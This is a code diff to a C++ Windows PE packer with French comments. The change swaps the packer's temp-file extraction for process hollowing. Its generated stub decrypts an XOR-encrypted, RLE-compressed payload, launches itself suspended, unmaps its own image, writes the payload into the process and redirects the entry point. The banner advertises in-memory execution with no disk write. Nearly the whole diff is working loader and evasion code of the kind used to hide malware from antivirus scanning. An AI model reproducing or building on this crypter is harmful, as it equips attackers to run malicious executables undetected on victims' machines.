@@ -8,25 +8,30 @@
 #include <fstream>
 #include <iostream>
 
-// Structure pour la section packed
 #pragma pack(push, 1)
 struct PackedSection {
-    DWORD magic;             // Signature 0x4B435041 ("PACK")
+    DWORD magic;             // 0x4B435041 ("PACK")
     DWORD unpacked_size;
     DWORD packed_size;
-    DWORD key[4];            // Clé de déchiffrement
-    // Le payload suit immédiatement après
+    DWORD key[4];
 };
 #pragma pack(pop)
 
-// ==================== CODE DU STUB UNPACKER ====================
-// Générer le code source du stub dans un fichier
+// Définitions pour compatibilité Windows 7
+#ifndef CONTEXT_FULL
+#define CONTEXT_FULL 0x10007
+#endif
+
+typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
+
+// ==================== GÉNÉRATION DU STUB ====================
 void generateStubSource(const char* outputPath) {
     FILE* f = fopen(outputPath, "w");
     if (!f) return;
 
     fprintf(f, "#include <windows.h>\n");
     fprintf(f, "#include <stdio.h>\n\n");
+
     fprintf(f, "#pragma pack(push, 1)\n");
     fprintf(f, "struct PackedSection {\n");
     fprintf(f, "    DWORD magic;\n");
@@ -35,6 +40,8 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "    DWORD key[4];\n");
     fprintf(f, "};\n");
     fprintf(f, "#pragma pack(pop)\n\n");
+
+    fprintf(f, "typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);\n\n");
 
     fprintf(f, "void decryptXOR(unsigned char* data, DWORD size, DWORD* key) {\n");
     fprintf(f, "    unsigned char* keyBytes = (unsigned char*)key;\n");
@@ -70,32 +77,22 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "    return writePos;\n");
     fprintf(f, "}\n\n");
 
-    // Utiliser int main au lieu de WinMain pour avoir la console
+    // Fonction principale avec Process Hollowing
     fprintf(f, "int main(int argc, char* argv[]) {\n");
     fprintf(f, "    char exePath[MAX_PATH];\n");
     fprintf(f, "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n\n");
 
+    // Ouvrir le fichier actuel
     fprintf(f, "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n");
-    fprintf(f, "    if (hFile == INVALID_HANDLE_VALUE) {\n");
-    fprintf(f, "        printf(\"Error: Cannot open self\\n\");\n");
-    fprintf(f, "        return 1;\n");
-    fprintf(f, "    }\n\n");
+    fprintf(f, "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n\n");
 
     fprintf(f, "    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);\n");
-    fprintf(f, "    if (!hMapping) {\n");
-    fprintf(f, "        printf(\"Error: Cannot map file\\n\");\n");
-    fprintf(f, "        CloseHandle(hFile);\n");
-    fprintf(f, "        return 1;\n");
-    fprintf(f, "    }\n\n");
+    fprintf(f, "    if (!hMapping) { CloseHandle(hFile); return 1; }\n\n");
 
     fprintf(f, "    unsigned char* fileData = (unsigned char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);\n");
-    fprintf(f, "    if (!fileData) {\n");
-    fprintf(f, "        printf(\"Error: Cannot map view\\n\");\n");
-    fprintf(f, "        CloseHandle(hMapping);\n");
-    fprintf(f, "        CloseHandle(hFile);\n");
-    fprintf(f, "        return 1;\n");
-    fprintf(f, "    }\n\n");
+    fprintf(f, "    if (!fileData) { CloseHandle(hMapping); CloseHandle(hFile); return 1; }\n\n");
 
+    // Trouver la section .packed
     fprintf(f, "    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;\n");
     fprintf(f, "    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileData + dosHeader->e_lfanew);\n");
     fprintf(f, "    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);\n\n");
@@ -112,27 +109,18 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        }\n");
     fprintf(f, "    }\n\n");
 
-    fprintf(f, "    if (!packedSec) {\n");
-    fprintf(f, "        printf(\"Error: .packed section not found\\n\");\n");
+    fprintf(f, "    if (!packedSec || packedSec->magic != 0x4B435041) {\n");
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
     fprintf(f, "        CloseHandle(hMapping);\n");
     fprintf(f, "        CloseHandle(hFile);\n");
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    fprintf(f, "    if (packedSec->magic != 0x4B435041) {\n");
-    fprintf(f, "        printf(\"Error: Invalid magic (0x%%08X)\\n\", packedSec->magic);\n");
-    fprintf(f, "        UnmapViewOfFile(fileData);\n");
-    fprintf(f, "        CloseHandle(hMapping);\n");
-    fprintf(f, "        CloseHandle(hFile);\n");
-    fprintf(f, "        return 1;\n");
-    fprintf(f, "    }\n\n");
-
+    // Décompresser en mémoire
     fprintf(f, "    unsigned char* decrypted = (unsigned char*)VirtualAlloc(NULL, packedSec->packed_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n");
     fprintf(f, "    unsigned char* decompressed = (unsigned char*)VirtualAlloc(NULL, packedSec->unpacked_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n");
 
     fprintf(f, "    if (!decrypted || !decompressed) {\n");
-    fprintf(f, "        printf(\"Error: Memory allocation failed\\n\");\n");
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
     fprintf(f, "        CloseHandle(hMapping);\n");
     fprintf(f, "        CloseHandle(hFile);\n");
@@ -144,7 +132,6 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "    DWORD decompSize = decompressRLE(decrypted, packedSec->packed_size, decompressed, packedSec->unpacked_size);\n\n");
 
     fprintf(f, "    if (decompSize == 0 || decompSize > packedSec->unpacked_size) {\n");
-    fprintf(f, "        printf(\"Error: Decompression failed (size=%%lu)\\n\", decompSize);\n");
     fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
     fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
     fprintf(f, "        UnmapViewOfFile(fileData);\n");
@@ -153,74 +140,151 @@ void generateStubSource(const char* outputPath) {
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
-    fprintf(f, "    char tempPath[MAX_PATH];\n");
-    fprintf(f, "    char tempFile[MAX_PATH];\n");
-    fprintf(f, "    GetTempPathA(MAX_PATH, tempPath);\n");
-    fprintf(f, "    GetTempFileNameA(tempPath, \"tmp\", 0, tempFile);\n\n");
+    // Process Hollowing commence ici
+    fprintf(f, "    IMAGE_DOS_HEADER* newDosHeader = (IMAGE_DOS_HEADER*)decompressed;\n");
+    fprintf(f, "    IMAGE_NT_HEADERS* newNtHeaders = (IMAGE_NT_HEADERS*)(decompressed + newDosHeader->e_lfanew);\n\n");
 
-    fprintf(f, "    char* ext = strrchr(tempFile, '.');\n");
-    fprintf(f, "    if (ext) strcpy(ext, \".exe\");\n\n");
-
-    fprintf(f, "    HANDLE hTempFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n");
-    fprintf(f, "    if (hTempFile == INVALID_HANDLE_VALUE) {\n");
-    fprintf(f, "        printf(\"Error: Cannot create temp file: %%s\\n\", tempFile);\n");
-    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
-    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
-    fprintf(f, "        UnmapViewOfFile(fileData);\n");
-    fprintf(f, "        CloseHandle(hMapping);\n");
-    fprintf(f, "        CloseHandle(hFile);\n");
-    fprintf(f, "        return 1;\n");
-    fprintf(f, "    }\n\n");
-
-    fprintf(f, "    DWORD written;\n");
-    fprintf(f, "    BOOL writeOk = WriteFile(hTempFile, decompressed, decompSize, &written, NULL);\n");
-    fprintf(f, "    CloseHandle(hTempFile);\n\n");
-
-    fprintf(f, "    if (!writeOk || written != decompSize) {\n");
-    fprintf(f, "        printf(\"Error: Write failed (%%lu / %%lu bytes)\\n\", written, decompSize);\n");
-    fprintf(f, "        DeleteFileA(tempFile);\n");
-    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
-    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
-    fprintf(f, "        UnmapViewOfFile(fileData);\n");
-    fprintf(f, "        CloseHandle(hMapping);\n");
-    fprintf(f, "        CloseHandle(hFile);\n");
-    fprintf(f, "        return 1;\n");
-    fprintf(f, "    }\n\n");
-
-    fprintf(f, "    VirtualFree(decrypted, 0, MEM_RELEASE);\n");
-    fprintf(f, "    VirtualFree(decompressed, 0, MEM_RELEASE);\n");
-    fprintf(f, "    UnmapViewOfFile(fileData);\n");
-    fprintf(f, "    CloseHandle(hMapping);\n");
-    fprintf(f, "    CloseHandle(hFile);\n\n");
-
-    // Construire la ligne de commande avec tous les arguments
-    fprintf(f, "    char cmdLine[32768] = {0};\n");
+    // Construire la ligne de commande
+    fprintf(f, "    char cmdLine[32768];\n");
+    fprintf(f, "    strcpy(cmdLine, exePath);\n");
     fprintf(f, "    if (argc > 1) {\n");
     fprintf(f, "        for (i = 1; i < argc; i++) {\n");
-    fprintf(f, "            if (i > 1) strcat(cmdLine, \" \");\n");
+    fprintf(f, "            strcat(cmdLine, \" \");\n");
     fprintf(f, "            strcat(cmdLine, argv[i]);\n");
     fprintf(f, "        }\n");
     fprintf(f, "    }\n\n");
 
+    // Créer le processus en mode suspendu
     fprintf(f, "    STARTUPINFOA si;\n");
     fprintf(f, "    PROCESS_INFORMATION pi;\n");
     fprintf(f, "    memset(&si, 0, sizeof(si));\n");
     fprintf(f, "    memset(&pi, 0, sizeof(pi));\n");
     fprintf(f, "    si.cb = sizeof(si);\n\n");
 
-    fprintf(f, "    BOOL created = CreateProcessA(tempFile, cmdLine[0] ? cmdLine : NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);\n");
-    fprintf(f, "    if (!created) {\n");
-    fprintf(f, "        printf(\"Error: Cannot start process (error %%lu)\\n\", GetLastError());\n");
-    fprintf(f, "        DeleteFileA(tempFile);\n");
+    fprintf(f, "    if (!CreateProcessA(exePath, cmdLine, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {\n");
+    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
+    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
+    fprintf(f, "        UnmapViewOfFile(fileData);\n");
+    fprintf(f, "        CloseHandle(hMapping);\n");
+    fprintf(f, "        CloseHandle(hFile);\n");
     fprintf(f, "        return 1;\n");
     fprintf(f, "    }\n\n");
 
+    // Obtenir le contexte du thread
+    fprintf(f, "    CONTEXT ctx;\n");
+    fprintf(f, "    memset(&ctx, 0, sizeof(ctx));\n");
+    fprintf(f, "    ctx.ContextFlags = CONTEXT_FULL;\n");
+    fprintf(f, "    if (!GetThreadContext(pi.hThread, &ctx)) {\n");
+    fprintf(f, "        TerminateProcess(pi.hProcess, 1);\n");
+    fprintf(f, "        CloseHandle(pi.hThread);\n");
+    fprintf(f, "        CloseHandle(pi.hProcess);\n");
+    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
+    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
+    fprintf(f, "        UnmapViewOfFile(fileData);\n");
+    fprintf(f, "        CloseHandle(hMapping);\n");
+    fprintf(f, "        CloseHandle(hFile);\n");
+    fprintf(f, "        return 1;\n");
+    fprintf(f, "    }\n\n");
+
+    // Lire l'adresse de base du PEB
+    fprintf(f, "    DWORD pebImageBase;\n");
+    fprintf(f, "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pebImageBase, sizeof(DWORD), NULL);\n\n");
+
+    // Unmapper l'ancienne image
+    fprintf(f, "    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n");
+    fprintf(f, "    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, \"NtUnmapViewOfSection\");\n");
+    fprintf(f, "    if (NtUnmapViewOfSection) {\n");
+    fprintf(f, "        NtUnmapViewOfSection(pi.hProcess, (PVOID)pebImageBase);\n");
+    fprintf(f, "    }\n\n");
+
+    // Allouer de la mémoire pour la nouvelle image
+    fprintf(f, "    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, \n");
+    fprintf(f, "                                          (LPVOID)newNtHeaders->OptionalHeader.ImageBase,\n");
+    fprintf(f, "                                          newNtHeaders->OptionalHeader.SizeOfImage,\n");
+    fprintf(f, "                                          MEM_COMMIT | MEM_RESERVE,\n");
+    fprintf(f, "                                          PAGE_EXECUTE_READWRITE);\n\n");
+
+    fprintf(f, "    if (!newImageBase) {\n");
+    fprintf(f, "        newImageBase = VirtualAllocEx(pi.hProcess, NULL,\n");
+    fprintf(f, "                                       newNtHeaders->OptionalHeader.SizeOfImage,\n");
+    fprintf(f, "                                       MEM_COMMIT | MEM_RESERVE,\n");
+    fprintf(f, "                                       PAGE_EXECUTE_READWRITE);\n");
+    fprintf(f, "    }\n\n");
+
+    fprintf(f, "    if (!newImageBase) {\n");
+    fprintf(f, "        TerminateProcess(pi.hProcess, 1);\n");
+    fprintf(f, "        CloseHandle(pi.hThread);\n");
+    fprintf(f, "        CloseHandle(pi.hProcess);\n");
+    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
+    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
+    fprintf(f, "        UnmapViewOfFile(fileData);\n");
+    fprintf(f, "        CloseHandle(hMapping);\n");
+    fprintf(f, "        CloseHandle(hFile);\n");
+    fprintf(f, "        return 1;\n");
+    fprintf(f, "    }\n\n");
+
+    // Écrire les headers
+    fprintf(f, "    WriteProcessMemory(pi.hProcess, newImageBase, decompressed, \n");
+    fprintf(f, "                       newNtHeaders->OptionalHeader.SizeOfHeaders, NULL);\n\n");
+
+    // Écrire les sections
+    fprintf(f, "    IMAGE_SECTION_HEADER* newSections = IMAGE_FIRST_SECTION(newNtHeaders);\n");
+    fprintf(f, "    for (i = 0; i < newNtHeaders->FileHeader.NumberOfSections; i++) {\n");
+    fprintf(f, "        if (newSections[i].SizeOfRawData > 0) {\n");
+    fprintf(f, "            WriteProcessMemory(pi.hProcess,\n");
+    fprintf(f, "                              (LPVOID)((DWORD)newImageBase + newSections[i].VirtualAddress),\n");
+    fprintf(f, "                              decompressed + newSections[i].PointerToRawData,\n");
+    fprintf(f, "                              newSections[i].SizeOfRawData,\n");
+    fprintf(f, "                              NULL);\n");
+    fprintf(f, "        }\n");
+    fprintf(f, "    }\n\n");
+
+    // Mettre à jour le PEB avec la nouvelle ImageBase
+    fprintf(f, "    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &newImageBase, sizeof(LPVOID), NULL);\n\n");
+
+    // Calculer le delta de relocation si nécessaire
+    fprintf(f, "    DWORD delta = (DWORD)newImageBase - newNtHeaders->OptionalHeader.ImageBase;\n");
+    fprintf(f, "    if (delta != 0) {\n");
+    fprintf(f, "        IMAGE_DATA_DIRECTORY relocDir = newNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n");
+    fprintf(f, "        if (relocDir.Size > 0) {\n");
+    fprintf(f, "            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(decompressed + relocDir.VirtualAddress);\n");
+    fprintf(f, "            while (reloc->VirtualAddress > 0) {\n");
+    fprintf(f, "                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n");
+    fprintf(f, "                WORD* relocData = (WORD*)((DWORD)reloc + sizeof(IMAGE_BASE_RELOCATION));\n");
+    fprintf(f, "                for (DWORD j = 0; j < numEntries; j++) {\n");
+    fprintf(f, "                    if ((relocData[j] >> 12) == IMAGE_REL_BASED_HIGHLOW) {\n");
+    fprintf(f, "                        DWORD offset = reloc->VirtualAddress + (relocData[j] & 0xFFF);\n");
+    fprintf(f, "                        DWORD relocAddr;\n");
+    fprintf(f, "                        ReadProcessMemory(pi.hProcess, (LPVOID)((DWORD)newImageBase + offset), &relocAddr, sizeof(DWORD), NULL);\n");
+    fprintf(f, "                        relocAddr += delta;\n");
+    fprintf(f, "                        WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)newImageBase + offset), &relocAddr, sizeof(DWORD), NULL);\n");
+    fprintf(f, "                    }\n");
+    fprintf(f, "                }\n");
+    fprintf(f, "                reloc = (IMAGE_BASE_RELOCATION*)((DWORD)reloc + reloc->SizeOfBlock);\n");
+    fprintf(f, "            }\n");
+    fprintf(f, "        }\n");
+    fprintf(f, "    }\n\n");
+
+    // Mettre à jour EAX avec le nouveau EntryPoint
+    fprintf(f, "    ctx.Eax = (DWORD)newImageBase + newNtHeaders->OptionalHeader.AddressOfEntryPoint;\n");
+    fprintf(f, "    SetThreadContext(pi.hThread, &ctx);\n\n");
+
+    // Reprendre l'exécution
+    fprintf(f, "    ResumeThread(pi.hThread);\n\n");
+
+    // Nettoyer
+    fprintf(f, "    VirtualFree(decrypted, 0, MEM_RELEASE);\n");
+    fprintf(f, "    VirtualFree(decompressed, 0, MEM_RELEASE);\n");
+    fprintf(f, "    UnmapViewOfFile(fileData);\n");
+    fprintf(f, "    CloseHandle(hMapping);\n");
+    fprintf(f, "    CloseHandle(hFile);\n\n");
+
+    // Attendre la fin du processus
     fprintf(f, "    WaitForSingleObject(pi.hProcess, INFINITE);\n");
     fprintf(f, "    DWORD exitCode = 0;\n");
     fprintf(f, "    GetExitCodeProcess(pi.hProcess, &exitCode);\n");
-    fprintf(f, "    CloseHandle(pi.hProcess);\n");
     fprintf(f, "    CloseHandle(pi.hThread);\n");
-    fprintf(f, "    DeleteFileA(tempFile);\n\n");
+    fprintf(f, "    CloseHandle(pi.hProcess);\n\n");
 
     fprintf(f, "    return exitCode;\n");
     fprintf(f, "}\n");
@@ -235,7 +299,6 @@ private:
     std::string outputPath;
     DWORD fileSize;
 
-    // ==================== COMPILATION DU STUB ====================
     bool compileStub(const std::string& stubExePath) {
         char tempPath[MAX_PATH];
         char stubSourcePath[MAX_PATH];
@@ -245,10 +308,8 @@ private:
         sprintf(errorLogPath, "%s\\stub_compile_error.txt", tempPath);
 
         printf("[*] Generating stub source code...\n");
-        printf("    Source: %s\n", stubSourcePath);
         generateStubSource(stubSourcePath);
 
-        // Vérifier que le fichier a été créé
         HANDLE hTest = CreateFileA(stubSourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         if (hTest == INVALID_HANDLE_VALUE) {
             fprintf(stderr, "[-] Failed to create stub source file\n");
@@ -257,15 +318,12 @@ private:
         CloseHandle(hTest);
 
         char compileCmd[1024];
-        // Compiler sans -mwindows pour avoir une application console
         sprintf(compileCmd, "gcc -O2 -s -o \"%s\" \"%s\" 2>\"%s\"",
                 stubExePath.c_str(), stubSourcePath, errorLogPath);
 
         printf("[*] Compiling unpacker stub...\n");
-        printf("    Command: %s\n", compileCmd);
         int result = system(compileCmd);
 
-        // Vérifier si le stub a été créé
         HANDLE hStub = CreateFileA(stubExePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         bool stubExists = (hStub != INVALID_HANDLE_VALUE);
         if (stubExists) CloseHandle(hStub);
@@ -273,7 +331,6 @@ private:
         if (result != 0 || !stubExists) {
             fprintf(stderr, "[-] Failed to compile stub (exit code: %d)\n", result);
 
-            // Afficher les erreurs de compilation
             FILE* errLog = fopen(errorLogPath, "r");
             if (errLog) {
                 fprintf(stderr, "\n--- Compilation errors ---\n");
@@ -285,16 +342,10 @@ private:
                 fprintf(stderr, "--- End of errors ---\n\n");
             }
 
-            fprintf(stderr, "[-] Stub source saved at: %s\n", stubSourcePath);
-            fprintf(stderr, "[-] Try compiling manually: gcc -mwindows -o stub.exe \"%s\"\n", stubSourcePath);
-
             DeleteFileA(errorLogPath);
-            // Ne pas supprimer le source pour debug
-            // DeleteFileA(stubSourcePath);
             return false;
         }
 
-        // Nettoyer les fichiers temporaires
         DeleteFileA(stubSourcePath);
         DeleteFileA(errorLogPath);
 
@@ -302,7 +353,6 @@ private:
         return true;
     }
 
-    // ==================== COMPRESSION RLE ====================
     std::vector<BYTE> compressRLE(const std::vector<BYTE>& input) {
         std::vector<BYTE> compressed;
         compressed.reserve(input.size());
@@ -337,7 +387,6 @@ private:
         return compressed;
     }
 
-    // ==================== CHIFFREMENT XOR ====================
     void encryptXOR(std::vector<BYTE>& data, const uint32_t key[4]) {
         const BYTE* keyBytes = reinterpret_cast<const BYTE*>(key);
         size_t keyLen = 16;
@@ -352,7 +401,6 @@ private:
         return r ? value + (alignment - r) : value;
     }
 
-    // ==================== INJECTION DES DONNÉES ====================
     bool injectPackedData(const std::string& stubExePath,
                           const std::vector<BYTE>& packedData,
                           const std::string& outputPath) {
@@ -458,9 +506,9 @@ private:
         SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
 
         printf("========================================================\n");
-        printf("    PE PACKER - TEMP FILE EXTRACTION METHOD\n");
-        printf("      RLE Compression + XOR Encryption\n");
-        printf("       Fully Functional on Windows 7+\n");
+        printf("    PE PACKER - PROCESS HOLLOWING METHOD\n");
+        printf("      RLE Compression + XOR + In-Memory Execution\n");
+        printf("       No Disk Write - Full Windows 7+ Support\n");
         printf("========================================================\n\n");
 
         SetConsoleTextAttribute(hConsole, 7);
@@ -558,7 +606,8 @@ public:
         printf("[+] Compression:    %.1f%%\n", (100.0 * compressed.size() / fileSize));
         printf("[+] Output file:    %s\n", outputPath.c_str());
         printf("[+] ========================================\n\n");
-        printf("[i] The packed exe will extract and run the original.\n\n");
+        printf("[i] Method: Process Hollowing (NO DISK WRITE)\n");
+        printf("[i] The packed exe runs entirely in memory.\n\n");
 
         return true;
     }
